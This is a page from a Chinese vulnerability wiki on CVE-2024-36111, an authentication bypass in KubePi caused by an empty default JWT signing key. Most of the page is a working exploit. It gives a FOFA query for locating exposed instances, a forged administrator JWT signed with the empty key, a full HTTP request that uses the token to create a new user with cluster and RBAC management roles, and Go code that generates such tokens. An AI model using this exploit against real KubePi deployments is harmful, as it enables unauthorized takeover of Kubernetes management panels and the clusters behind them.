<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/KubePi/KubePi%E5%AD%98%E5%9C%A8JWT%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%28CVE-2024-36111%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>KubePi存在JWT验证绕过漏洞(CVE-2024-36111) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "KubePi\u5b58\u5728JWT\u9a8c\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2024-36111)", url: "#_top", children: [
              {title: "fofa", url: "#fofa" },
              {title: "poc", url: "#poc" },
              {title: "\u751f\u6210jwt token\u7a0b\u5e8f", url: "#jwt-token" },
              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Kuboard/Kuboard%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Kuboard/Kuboard%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/" class="btn btn-xs btn-link">
        Kuboard默认口令
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../KubePi%20LoginLogsSearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2023-22478/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../KubePi%20LoginLogsSearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2023-22478/" class="btn btn-xs btn-link">
        KubePi LoginLogsSearch 未授权访问漏洞 CVE-2023-22478
      </a>
    </div>
    
  </div>

    

    <h1 id="kubepijwtcve-2024-36111">KubePi存在JWT验证绕过漏洞(CVE-2024-36111)<a class="headerlink" href="#kubepijwtcve-2024-36111" title="Permanent link">&para;</a></h1>
<p>kubepi jwttoken 校验存在缺陷，默认配置文件中jwt密钥为空，虽然读取配置文件相关逻辑中检测到密钥为空时，会生成一个随机32位字符串覆盖配置文件中的密钥，但是实际校验时，密钥为空，使用空密钥生成jwttoken可绕过登录校验，可直接接管后台</p>
<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="s">&quot;kubepi&quot;</span>
</code></pre></div>
<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<p><img alt="image" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302144253.png" /></p>
<p>使用空密钥生成jwt token </p>
<div class="highlight"><pre><span></span><code><span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="na">eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9</span><span class="p">.</span><span class="na">dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4</span>
</code></pre></div>
<p>使用生成的密钥创建用户tang</p>
<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">kubepi</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">v1</span><span class="o">/</span><span class="n">users</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">9982</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">248</span>
<span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span>
<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span>
<span class="nl">lang</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span>
<span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="mi">0</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">114.0.5735.199</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;&quot;</span>
<span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:9982</span>
<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">same</span><span class="o">-</span><span class="n">origin</span>
<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">cors</span>
<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">empty</span>
<span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:9982/kubepi/user-management/users/create</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
<span class="nl">Authorization</span><span class="p">:</span><span class="w"> </span><span class="n">Bearer</span><span class="w"> </span><span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="na">eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9</span><span class="p">.</span><span class="na">dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4</span>
<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>

<span class="p">{</span><span class="s">&quot;apiVersion&quot;</span><span class="p">:</span><span class="s">&quot;v1&quot;</span><span class="p">,</span><span class="s">&quot;kind&quot;</span><span class="p">:</span><span class="s">&quot;User&quot;</span><span class="p">,</span><span class="s">&quot;name&quot;</span><span class="p">:</span><span class="s">&quot;tang&quot;</span><span class="p">,</span><span class="s">&quot;roles&quot;</span><span class="p">:</span><span class="o">[</span><span class="s">&quot;Common User&quot;</span><span class="p">,</span><span class="s">&quot;Manage Image Registries&quot;</span><span class="p">,</span><span class="s">&quot;Manage Clusters&quot;</span><span class="p">,</span><span class="s">&quot;Manage RBAC&quot;</span><span class="o">]</span><span class="p">,</span><span class="s">&quot;nickName&quot;</span><span class="p">:</span><span class="s">&quot;tang&quot;</span><span class="p">,</span><span class="s">&quot;email&quot;</span><span class="p">:</span><span class="s">&quot;tang@qq.com&quot;</span><span class="p">,</span><span class="s">&quot;authenticate&quot;</span><span class="p">:{</span><span class="s">&quot;password&quot;</span><span class="p">:</span><span class="s">&quot;12345678@Tang&quot;</span><span class="p">},</span><span class="s">&quot;mfa&quot;</span><span class="p">:{</span><span class="s">&quot;enable&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="s">&quot;secret&quot;</span><span class="p">:</span><span class="s">&quot;&quot;</span><span class="p">}}</span>
</code></pre></div>
<p><img alt="image" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302142936.png" /></p>
<p><img alt="image" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302142055.png" /></p>
<h2 id="jwt-token">生成jwt token程序<a class="headerlink" href="#jwt-token" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="kn">package</span><span class="w"> </span><span class="nx">main</span>

<span class="kn">import</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="s">&quot;fmt&quot;</span>
<span class="w">    </span><span class="s">&quot;github.com/kataras/iris/v12/middleware/jwt&quot;</span>
<span class="w">    </span><span class="s">&quot;time&quot;</span>
<span class="p">)</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">jwtMaxAge</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">100000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Minute</span>

<span class="kd">type</span><span class="w"> </span><span class="nx">UserProfile</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Name</span><span class="w">                </span><span class="kt">string</span><span class="w">              </span><span class="s">`json:&quot;name&quot;`</span>
<span class="w">    </span><span class="nx">NickName</span><span class="w">            </span><span class="kt">string</span><span class="w">              </span><span class="s">`json:&quot;nickName&quot;`</span>
<span class="w">    </span><span class="nx">Email</span><span class="w">               </span><span class="kt">string</span><span class="w">              </span><span class="s">`json:&quot;email&quot;`</span>
<span class="w">    </span><span class="nx">Language</span><span class="w">            </span><span class="kt">string</span><span class="w">              </span><span class="s">`json:&quot;language&quot;`</span>
<span class="w">    </span><span class="nx">ResourcePermissions</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">][]</span><span class="kt">string</span><span class="w"> </span><span class="s">`json:&quot;resourcePermissions&quot;`</span>
<span class="w">    </span><span class="nx">IsAdministrator</span><span class="w">     </span><span class="kt">bool</span><span class="w">                </span><span class="s">`json:&quot;isAdministrator&quot;`</span>
<span class="w">    </span><span class="nx">Mfa</span><span class="w">                 </span><span class="nx">Mfa</span><span class="w">                 </span><span class="s">`json:&quot;mfa&quot;`</span>
<span class="p">}</span>

<span class="kd">type</span><span class="w"> </span><span class="nx">Mfa</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Enable</span><span class="w">   </span><span class="kt">bool</span><span class="w">   </span><span class="s">`json:&quot;enable&quot;`</span>
<span class="w">    </span><span class="nx">Secret</span><span class="w">   </span><span class="kt">string</span><span class="w"> </span><span class="s">`json:&quot;secret&quot;`</span>
<span class="w">    </span><span class="nx">Approved</span><span class="w"> </span><span class="kt">bool</span><span class="w">   </span><span class="s">`json:&quot;approved&quot;`</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">jwtSigner</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">jwt</span><span class="p">.</span><span class="nx">NewSigner</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">HS256</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">jwtMaxAge</span><span class="p">)</span>
<span class="w">    </span><span class="nx">test</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">][]</span><span class="kt">string</span><span class="p">{}</span>
<span class="w">    </span><span class="nx">profile</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">UserProfile</span><span class="p">{</span>
<span class="w">        </span><span class="nx">Name</span><span class="p">:</span><span class="w">                </span><span class="s">&quot;admin&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">NickName</span><span class="p">:</span><span class="w">            </span><span class="s">&quot;Administrator&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">Email</span><span class="p">:</span><span class="w">               </span><span class="s">&quot;support@fit2cloud.com&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">Language</span><span class="p">:</span><span class="w">            </span><span class="s">&quot;zh-CN&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">ResourcePermissions</span><span class="p">:</span><span class="w"> </span><span class="nx">test</span><span class="p">,</span>
<span class="w">        </span><span class="nx">IsAdministrator</span><span class="p">:</span><span class="w">     </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nx">Mfa</span><span class="p">:</span><span class="w"> </span><span class="nx">Mfa</span><span class="p">{</span>
<span class="w">            </span><span class="nx">Secret</span><span class="p">:</span><span class="w">   </span><span class="s">&quot;&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nx">Enable</span><span class="p">:</span><span class="w">   </span><span class="kc">false</span><span class="p">,</span>
<span class="w">            </span><span class="nx">Approved</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">nonejwt</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">jwtSigner</span><span class="p">.</span><span class="nx">Sign</span><span class="p">(</span><span class="nx">profile</span><span class="p">)</span>
<span class="w">    </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">nonejwt</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-8q5r-cvcw-4wx7">https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-8q5r-cvcw-4wx7</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Kuboard/Kuboard%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Kuboard/Kuboard%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/" class="btn btn-xs btn-link">
        Kuboard默认口令
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../KubePi%20LoginLogsSearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2023-22478/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../KubePi%20LoginLogsSearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2023-22478/" class="btn btn-xs btn-link">
        KubePi LoginLogsSearch 未授权访问漏洞 CVE-2023-22478
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>